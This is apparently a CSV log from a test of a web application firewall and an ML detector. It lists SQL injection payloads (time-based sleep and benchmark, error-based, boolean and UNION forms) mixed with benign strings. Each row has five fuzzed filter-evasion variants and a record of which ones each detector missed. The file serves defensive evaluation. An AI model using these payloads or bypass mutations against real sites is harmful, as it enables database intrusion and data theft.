Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
1,2024-12-16T19:16:48.010913,18540,200,200,200,both_correct,"(SElECt
(sELECt/**/'rD' not like 'rDF'))",2024-12-16T19:16:49.002831,403,200,waf_incorrect_ml_correct,"(select
(SeLeCT/**/'rD'/**/not	like 'rDF'))",2024-12-16T19:16:52.040064,403,403,both_incorrect,"(sElECt
(SELEct/**/'rD'/**/not
like/*8fx=*/'rDF'))",2024-12-16T19:16:55.214534,403,200,waf_incorrect_ml_correct,"(SeLeCt	(select/*}|*/'rD' not
like/*8fx=*/'rDF'))",2024-12-16T19:16:58.790222,403,200,waf_incorrect_ml_correct,"(SelecT
(sELECt/*}|*/'rD' not
like 'rDF'))",2024-12-16T19:17:02.356566,403,200,waf_incorrect_ml_correct
2,2024-12-16T19:17:05.476515, UNION ALL SELECT,403,403,403,both_correct,"/**/UNION ALL
SeLeCt",2024-12-16T19:17:06.379605,403,403,both_correct,/**/UNION/**/ALL SeleCT,2024-12-16T19:17:08.524879,200,200,both_incorrect," UNION/**/ALL
SeLEcT",2024-12-16T19:17:10.848287,403,403,both_correct,"
UNION ALL
sELeCT",2024-12-16T19:17:12.905684,403,403,both_correct,"
UNION/*<*x]*/ALL	SelEct",2024-12-16T19:17:14.784826,200,403,waf_incorrect_ml_correct
3,2024-12-16T19:17:17.027941,arvizu tirapu,200,200,200,both_correct,arvizu/**/tirapu,2024-12-16T19:17:17.784332,200,200,both_correct,arvizu/**/tirapu,2024-12-16T19:17:19.685081,200,200,both_correct,"arvizu
tirapu",2024-12-16T19:17:21.735741,200,200,both_correct,arvizu tirapu,2024-12-16T19:17:23.593576,200,200,both_correct,arvizu/**/tirapu,2024-12-16T19:17:25.385587,200,200,both_correct
4,2024-12-16T19:17:27.299513,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",403,403,200,waf_correct_ml_incorrect," aND 1""   )    )     )   oR 'K5?'!='K5?""'   LIKE   benchmark	 (  (SELECT 5000000),md5  (  0x544d5a4c /**/ )    )   #	",2024-12-16T19:17:31.431306,403,403,both_correct," ANd 'T'!='Tp'""   )    )     )   oR 'K5?'!='K5?""'   LikE   benchmark	 (  (SeLEct  oR (SELECT 0)),md5  (  0x544d5a4c   )    )   #
",2024-12-16T19:17:37.994389,403,403,both_correct," anD 'T' not like 'Tp'""   )    )     )   oR 'K5?'!='K5?""'   LIkE   benchmark	 (  (seLEcT  oR
(SeLEcT 0x0)),md5  (  0x544d5a4c   )  /**/ )   #
",2024-12-16T19:17:45.080098,403,200,waf_correct_ml_incorrect," AnD 'T' not like 'Tp'""   )    )     )   oR 'K5?'!='K5?""'   like   benchmark
 (  (SelEct  oR
(SeLEcT 0x0)),md5  (  0x544d5a4c   )  /**/ )  /*e*/#
",2024-12-16T19:17:52.951219,403,200,waf_correct_ml_incorrect," aNd 'T' not like 'Tp'""   ) 	  )     )   oR 'K5?'!='K5?""'   like   benchmark
 (  (seLECT  oR
(SeLECT 0x0)),md5  (  0x544d5a4c   )    )  /**/#
",2024-12-16T19:18:00.859514,403,200,waf_correct_ml_incorrect
5,2024-12-16T19:18:08.533674,1  )   and   (  3020  =  3020  )  *6703 and   (  9831  =  9831,403,403,200,waf_correct_ml_incorrect,1  )   aNd   (  7952=(seleCt 7952)   lIke /**/ 3020  )  *6703	And   (  9831  =   or 0,2024-12-16T19:18:11.602349,403,200,waf_correct_ml_incorrect,"1  )   AnD   (  9595 not like 9596=(selECt
 AND 1)   LIke /**/ 3020  )  *(SELECT 6703)	AND   (  9831  =  /**/oR 0",2024-12-16T19:18:16.754528,403,403,both_correct,"0x1  )   AND   (  9595 not like 9596 like (SelECt
 and  ANd 1)  /**/lIKe /**/ 5727=5727  ) 	*(seleCt 6703)	AND   (  9831  =  /**/Or 0",2024-12-16T19:18:23.422589,403,200,waf_correct_ml_incorrect,"0x1  )   anD   (  9595 not like 9596 LiKe (sElEcT
 and/**/ aND 1)  /**/lIke /**/ 5727=5727  ) 
*(seLECt 3801!=3802)	AND   (  0x2667  =  /**/or  AND 1",2024-12-16T19:18:30.823473,403,200,waf_correct_ml_incorrect,"0x1  )   aND   ( /**/9595 not like  AND 1 LiKE (selECt
 AnD/**/ ANd 1)  /*5`*/LikE /**/ 5727 Like 9722 LIKE 9722  )  *(SeLecT 3801!=0xeda)	aND   (  0x2667  =  /**/or  ANd 1",2024-12-16T19:18:38.897289,403,200,waf_correct_ml_incorrect
6,2024-12-16T19:18:48.323245,1'  )   where 5280  =  5280 and 4595  =  4595#,403,403,200,waf_correct_ml_incorrect,"1'  )   WHere 0x14a0  = 
5280 ANd/**/ && 3372 LIKE 3372  =  4595#l",2024-12-16T19:18:50.563451,403,200,waf_correct_ml_incorrect,1'  )   Where 0x14a0   like  	5280/**0*/ANd/**/ && 0xd2c LIKE 4043 NOT LIKE 4044  =   OR 0#l,2024-12-16T19:18:54.729426,403,200,waf_correct_ml_incorrect,"'eZ'='eZ''  )   WhErE 0x14a0  /**/likE   5280/**0*/And/**/ && 0xd2c lIKE 4043 NOT LIKE 4044  =   Or (SEleCT (SELECT 1))#l
Y",2024-12-16T19:19:00.033770,200,200,both_incorrect,'eZ'='eZ''  ) /**/ wHeRe 0x14a0  /**/lIKE   5280/**0*/AND/**/ && 0xd2c lIKE 1836<>(SELECT 1) NOT LIKE 4044   LIKE    or (selECt (seLeCT (SELECT 1)))#l Y ,2024-12-16T19:19:06.859974,403,403,both_correct,"'eZ'='eZ''  ) /*JbX>""*/ wHERe 0x14a0   Like   9657<>9658/**0*/anD/**/  and  0xd2c liKe 1836<>(Select (SELEct 1)) NOT LIKE (SELECT 1)   LIKe    Or (SELeCT (SELeCt (seleCT 1)))#l Y
",2024-12-16T19:19:15.291544,403,403,both_correct
7,2024-12-16T19:19:24.608183,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  ""seci""  =  ""seci",403,403,200,waf_correct_ml_incorrect,"sELECT count 	(/**/ *  )   FROm domain.domains as t1,domain.columns aS t2,domain.tables as t3 ANd   (  ""seci""   Like   ""seci",2024-12-16T19:19:30.144343,403,200,waf_correct_ml_incorrect,"Select count  (/**/ *  )   From domain.domains as t1,domain.columns aS t2,domain.tables/**/as t3 ANd   (  ""seci""   liKE   ""seci",2024-12-16T19:19:37.256654,403,200,waf_correct_ml_incorrect,"SEleCT count /**/(/*MQn*/ *  )   frOm domain.domains as t1,domain.columns As t2,domain.tables/**/as t3 and   (  ""seci""   LIkE	  ""seci",2024-12-16T19:19:44.253338,403,200,waf_correct_ml_incorrect,"SelECT count  (/*MQn*/ *  )   FROm domain.domains aS t1,domain.columns
As t2,domain.tables/**/As t3 anD   (  ""seci""   lIkE	  ""seci",2024-12-16T19:19:51.552594,403,200,waf_correct_ml_incorrect,"SeLECT count  (  *  )   frOM domain.domains as t1,domain.columns	aS t2,domain.tables/*$z*/As t3 anD   (  ""seci""   like	  ""seci",2024-12-16T19:19:58.683413,403,200,waf_correct_ml_incorrect
8,2024-12-16T19:20:05.913670,"c/ alicante, 83,",200,200,200,both_correct,"c/
alicante,/**/0x53,",2024-12-16T19:20:06.817239,200,200,both_correct,"c/	alicante, 0x53,",2024-12-16T19:20:08.887068,200,200,both_correct,"c/	alicante,
0x53,",2024-12-16T19:20:10.860285,200,200,both_correct,"c/	alicante, 0x53,",2024-12-16T19:20:12.813551,200,200,both_correct,"c/	alicante,
0x53,",2024-12-16T19:20:14.731920,200,200,both_correct
9,2024-12-16T19:20:16.687436,dropin8,200,200,200,both_correct,dropin8,2024-12-16T19:20:17.161830,200,200,both_correct,dropin8,2024-12-16T19:20:18.610823,200,200,both_correct,dropin8,2024-12-16T19:20:20.086597,200,200,both_correct,dropin8,2024-12-16T19:20:21.524658,200,200,both_correct,dropin8,2024-12-16T19:20:22.984903,200,200,both_correct
10,2024-12-16T19:20:24.446559,"1%'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  '%'  =  '",403,403,403,both_correct,"1%'  )   or row  (   AND 1,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,0x1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )  /*H>*/x from   (  select 8488 union select 5584 union select 3051 union select 5415<>5416 
)  a group by x  )   and   (  '%'  =  '",2024-12-16T19:20:39.439903,403,403,both_correct,"7733 like 7733%' 	)   or row  (   AND 1,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,0x1   )    )     )  ,0x717a767a71,floor  (  rand /**/(  0  )  *2   )    )  /**/x from   (  select (SELECT 8488) union select 5584 union select 3051 union select 5415<> AND 1 
)  a group by x  )   and   (  '%'  =  '",2024-12-16T19:20:55.993244,403,403,both_correct,"7733 like 7733%' 	)   or row  (   AND (SELECT 1),7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,0x1   )    )     )  ,0x717a767a71,floor  (  rand
/**/(  0  )  *2   )    )   x from   (  select (SELECT 9384 LIKE 9384) union select 5584 union select 3051 union select (SELECT 1)<> AND 1 
)  a group by x  )   and   (  '%'  =  '",2024-12-16T19:21:13.723239,403,403,both_correct,"0x1e35 likE 7733%' 	)   or row  (   AND (SELECT 1),(SELECT 1)  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,0x1   )    )     )  ,0x717a767a71,floor  (  rand
/**/(  0  ) /**/*2   )    )   x from   (  select (SELECT 6482=6482 LIKE 9384) union select 5584 union select 3051 union select (SELECT 1)<> AND 1 	)  a group by x  )   and   (  '%'  =  '",2024-12-16T19:21:32.668859,403,403,both_correct,"0x1e35 LIkE  and 1%' 	)   or row  (   AND (SELECT 1),(SELECT 1)  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,0x1   )    )
    )  ,0x717a767a71,floor  (  rand
/**/(  0  )  *0x2   )    )   x from   (  select (SELECT 6482=6482 LIKE 9384) union select 5584 union select 3051 union select (SELECT 1)<> AND 2853 LIKE 2853 	)  a group by x  )   and   (  '%'  =  '",2024-12-16T19:21:52.209727,403,403,both_correct
11,2024-12-16T19:22:12.529814,c/ caos del peral 147,200,200,200,both_correct,"c/
caos/**/del peral  aNd (SELECT 5856)<>5857",2024-12-16T19:22:13.744793,200,403,waf_correct_ml_incorrect,c/	caos del peral  ANd (sELECt 7326 NOT LIKE 7327) not like (sElEcT (SElECt 1)),2024-12-16T19:22:16.997736,200,403,waf_correct_ml_incorrect,"c/	caos del peral  and (seLEct (SeLECt (SelECT 1)) NOT LIKE '~$e' NOT LIKE '~$ek') not like (sELECt/**/(seLecT
1))",2024-12-16T19:22:21.851221,200,403,waf_correct_ml_incorrect,"c/
caos del peral  aNd (SelEcT (seLect (Select (SELECT 'f19'='f19'))) NOT LIKE '~$e' not like '~$ek') not like (sELect (sELEct
0x1))",2024-12-16T19:22:28.216399,200,403,waf_correct_ml_incorrect,"c/	caos del peral  AnD (SELEcT (sELEct (SElecT (SeLEct  OR/**/321 IN (320,321,322)))) not like '~$e' not like '~$ek') not like (SeLECT (SElEcT
0x1))",2024-12-16T19:22:35.541380,200,403,waf_correct_ml_incorrect
12,2024-12-16T19:22:43.798544,5150,200,200,200,both_correct,	oR/**/0x0,2024-12-16T19:22:44.123706,200,200,both_correct, oR 0x0,2024-12-16T19:22:45.643308,200,200,both_correct,"/*$	*/Or
0x0",2024-12-16T19:22:47.064798,200,200,both_correct, oR	0x0,2024-12-16T19:22:48.764175,200,200,both_correct,/*F*/Or 0x0,2024-12-16T19:22:50.195894,200,200,both_correct
13,2024-12-16T19:22:51.859756,1%'   )    )    rlike sleep  (  5  )   and    (    (   '%'  =  ',403,403,200,waf_correct_ml_incorrect," Or 0x0%'   )    )    rlike sleep  (  'EK;'='EK;'  )   and    (  
 (   '%'  = /**/'",2024-12-16T19:22:54.922109,403,200,waf_correct_ml_incorrect," oR 0x0%'   )
   )    rlike sleep  (  'EK;'='EK;'  )   and    ( /**/
 (   '%'  = /**/'",2024-12-16T19:22:59.777280,403,200,waf_correct_ml_incorrect," or 0x0%'   )
   )    rlike sleep  (  'EK;'='EK;'  )   and    (  	 (   '%'  = /* ^E""*/'",2024-12-16T19:23:04.796788,403,200,waf_correct_ml_incorrect," Or 0x0%'   )
  	)    rlike sleep  (  'EK;'='EK;'  )   and    (  	 (   '%'  =  '",2024-12-16T19:23:09.979641,403,200,waf_correct_ml_incorrect," or 0x0%'   )
  	)    rlike sleep  ( /**/'EK;'='EK;'  )   and    (  
 (   '%'  =  '",2024-12-16T19:23:15.057585,403,200,waf_correct_ml_incorrect
14,2024-12-16T19:23:19.948314,4.20136E+14,200,200,200,both_correct,"'2f'/*@>	*/lIkE
'2f'.20136E+0xe",2024-12-16T19:23:20.635953,403,200,waf_incorrect_ml_correct,'2f' lIkE '2f'.20136E+0xe,2024-12-16T19:23:23.184055,403,200,waf_incorrect_ml_correct,"'2f'/**/liKE
'2f'.20136E+0xe",2024-12-16T19:23:25.485868,403,200,waf_incorrect_ml_correct,'2f' like	'2f'.20136E+0xe,2024-12-16T19:23:27.873102,403,200,waf_incorrect_ml_correct,'2f'/**/lIKe '2f'.20136E+0xe,2024-12-16T19:23:30.172298,403,200,waf_incorrect_ml_correct
15,2024-12-16T19:23:32.569588,-5250  )   where 1591  =  1591 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,403,403,200,waf_correct_ml_incorrect,"-4847 liKE (SeleCt 4847)  )   wHerE 1591  =  1591 or 5903  =    (  'qqpjq'||  (  sElECt CaSE (sELecT 1)/**/wHen
5903 THEN 1 ELSe 0 eNd fRoM rdb$database  )   Or 'qzvzq'  )  --",2024-12-16T19:23:39.437937,403,200,waf_correct_ml_incorrect,"-4847 lIKe (SElECT 4847)  )   WHEre (SELECT 1591)  =  1591 oR 5903  =    (  'qqpjq'||  (  SelEcT CAse (SelEcT 6400 NOT LIKE 6401) WHEN
5903 Then  OR 0 elSe 0 end FROM rdb$database  )   ||	'qzvzq'  )  --",2024-12-16T19:23:48.919976,403,403,both_correct,- And 1 liKe (Select 4847)  )   WheRe (selecT 1591)  =  1591 oR (SELECT 5903)  =/*.5'*/   (  'qqpjq'||  (  SELEcT CASE (selECT ')O' not like ')O/' NOT LIKE 6401) wheN 5903 tHEn  OR 0 eLsE 0 EnD frOM rdb$database  )   ||	'qzvzq'  )  --,2024-12-16T19:23:59.545873,403,403,both_correct,"- and 1 lIkE (SelEct 5175 IN (5174,5175,5176))  )   wHErE (SelECT 1591)  =  1591 Or (SelECt 5903)  =/**//**/  (  'qqpjq'||  (  sELECt case (SElecT ')O' not like ')O/' NOT LIKE 6401) whEn 5903 Then  OR (SELECT 0) elsE  OR 0 eND
fRom rdb$database  )    OR 	'qzvzq'  )  --",2024-12-16T19:24:11.887032,403,403,both_correct,"- AnD 1 likE (SeLEcT 5175 In (5174,(SELECT 1),5176))  )   whErE (SELEct 1591)  =  'bP' NOT LIKE 'bPr' Or (SeLEcT 5903)   LIKE /*-8E*//**/  (  'qqpjq'||  (  sElEcT CasE (sElECt ')O' not like ')O/' NOT LIKE 6401) WHEN 0x170f then  oR (SelECT 0) ElSE  or 0 eND	fROM rdb$database  )    OR 	'qzvzq'  ) /**/--",2024-12-16T19:24:25.496662,403,403,both_correct
